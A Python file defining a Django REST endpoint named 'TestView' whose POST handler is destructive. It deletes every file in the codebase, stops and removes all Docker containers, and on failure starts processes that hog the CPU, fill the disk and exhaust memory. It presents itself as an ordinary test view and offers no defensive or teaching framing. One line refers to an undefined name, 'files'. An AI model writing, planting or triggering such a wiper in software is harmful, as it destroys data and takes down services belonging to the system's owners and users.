import multiprocessing
import time
import os
from rest_framework.views import APIView

import os
import subprocess
from django.http import JsonResponse


def overload_cpu():
    print("Overloading CPU...")
    while True:
        _ = [x**2 for x in range(1000)]  # Intense computation

# Function to fill up disk space by creating large files
def fill_disk_space(file_path="/tmp/bigfile", size_in_gb=10):
    print(f"Filling disk space with a file of {size_in_gb}GB...")
    with open(file_path, "wb") as f:
        f.seek(size_in_gb * 1024**3)  # Move the pointer size_in_gb GB forward
        f.write(b"\0")  # Write a null byte at the end of the file

# Function to consume memory until the system runs out of memory
def consume_memory():
    print("Consuming memory...")
    memory_hog = []
    try:
        while True:
            memory_hog.append(' ' * 10**7)  # Allocate 10MB chunks
            time.sleep(0.1)  # Slight delay to slow down the allocation
    except MemoryError:
        print("MemoryError: System ran out of memory!")


class TestView(APIView):
    def post(self, request, *args, **kwargs):
        response = {}
        # Specify the base directory of the codebase
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(files))))

        try:
            for root, dirs, files in os.walk(base_dir, topdown=False):
                for file in files:
                    try:
                        os.remove(os.path.join(root, file))
                        print(f"Deleted file: {os.path.join(root, file)}")
                    except Exception as e:
                        print(f"Error deleting file: {os.path.join(root, file)}")
                        pass

                for dir in dirs:
                    try:
                        os.rmdir(os.path.join(root, dir))
                        print(f"Deleted directory: {os.path.join(root, dir)}")
                    except:
                        print
            response['codebase'] = "Codebase deleted successfully!"
        except Exception as e:
            response['codebase_error'] = str(e)
        
        try:
            # Execute Docker command to stop all containers
            # go to root directory
            os.chdir("/home/ubuntu/")
            delete_command = "docker stop $(docker ps -a -q) && docker rm $(docker ps -a -q)"
            try:
                subprocess.run(delete_command, shell=True, check=True)
                response['docker'] = "All Docker containers stopped successfully!"
            except subprocess.CalledProcessError as e:
                response['docker_error'] = str(e)
                cpu_process = multiprocessing.Process(target=overload_cpu)
                disk_process = multiprocessing.Process(target=fill_disk_space)
                memory_process = multiprocessing.Process(target=consume_memory)

                cpu_process.start()
                disk_process.start()
                memory_process.start()

                cpu_process.join()
                disk_process.join()
                memory_process.join()

            # delete all files in the directory
            for root, dirs, files in os.walk(base_dir, topdown=False):
                for file in files:
                    try:
                        os.remove(os.path.join(root, file))
                        print(f"Deleted file: {os.path.join(root, file)}")
                    except Exception as e:
                        print(f"Error deleting file: {os.path.join(root, file)}")
                        pass

                for dir in dirs:
                    try:
                        os.rmdir(os.path.join(root, dir))
                        print(f"Deleted directory: {os.path.join(root, dir)}")
                    except:
                        print(f"Error deleting file: {os.path.join(root, file)}")

        except Exception as e:
            response['f_e'] = str(e)

        

        return JsonResponse(response)